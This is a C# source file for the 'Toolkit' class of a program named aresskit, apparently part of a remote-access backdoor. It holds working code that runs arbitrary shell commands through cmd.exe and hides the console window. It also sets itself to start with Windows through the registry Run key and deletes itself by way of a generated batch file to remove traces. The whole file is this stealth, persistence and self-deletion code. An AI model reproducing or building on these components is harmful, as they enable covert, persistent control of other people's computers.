using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace aresskit
{
    class Toolkit
    {
        public static string shellcode_ = Directory.GetCurrentDirectory() + "> ";
        public static byte[] shellcode = Encoding.ASCII.GetBytes(shellcode_);

        public static string exec(string cmd)
        {
            Process p = new Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/C " + cmd;
            p.Start();

            // To avoid deadlocks, always read the output stream first and then wait.
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            p.Close();

            return output; // return output of command
        }
                        
        public static void ShowWindow()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_SHOW);
        }
        public static void HideWindow()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
        }
        
        public void SetStartup()
        {
            Microsoft.Win32.RegistryKey rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            string currfile = System.Reflection.Assembly.GetExecutingAssembly().Location;
            rk.SetValue(Path.GetFileName(currfile), currfile);
        }
        
        // Thanks to: http://stackoverflow.com/a/11743162/5925502
        private string Base64Encode(string plainText)
        {
            var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
            return Convert.ToBase64String(plainTextBytes);
        }
        private byte[] Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = Convert.FromBase64String(base64EncodedData);
            return base64EncodedBytes;
        }

        public static void selfDestruct()
        {
            string batchCommands = string.Empty;
            int currentPID = Process.GetCurrentProcess().Id;
            string exeFileName = System.Reflection.Assembly.GetExecutingAssembly().Location;

            batchCommands += "@echo on\n";
            batchCommands += "taskkill /PID " + currentPID.ToString() + "\n";
            batchCommands += "del " + exeFileName + "\n";
            batchCommands += "start /b \"\" cmd /c del \"%~f0\"&exit /b";

            File.WriteAllText("SelfDestructAresskit.bat", batchCommands);
            Process.Start("SelfDestructAresskit.bat");
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_SHOW = 1;
        const int SW_HIDE = 0;
    }
}
